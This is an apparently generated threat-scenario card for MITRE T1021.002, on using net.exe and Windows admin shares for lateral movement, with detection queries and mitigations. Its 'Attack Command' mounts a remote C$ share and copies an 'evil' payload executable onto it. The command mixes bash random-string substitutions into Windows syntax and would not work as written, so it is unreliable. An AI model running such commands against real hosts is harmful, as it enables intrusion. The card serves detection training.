---
type: campaign
scenario_id: 203
tactic: Lateral Movement
technique: "T1021.002: Remote Services: SMB/Windows Admin Shares"
technique_id: T1021.002
tags: [campaign, lotl, lateral_movement]
---

# Using net.exe to access admin share for lateral movement.

## Threat Description
Using net.exe to access admin share for lateral movement.

## Attack Command
```
net use \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\C$ /user:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) && copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\C$\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)
```

## Detection Logic
Monitor net use: `wmic process where name='net.exe' get commandline | findstr C$`; Event ID 5145.

## Mitigation
Disable admin shares: `reg add HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters /v AutoShareWks /t REG_DWORD /d 0`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect SMB admin share access and suggest share restrictions.

## References
- MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
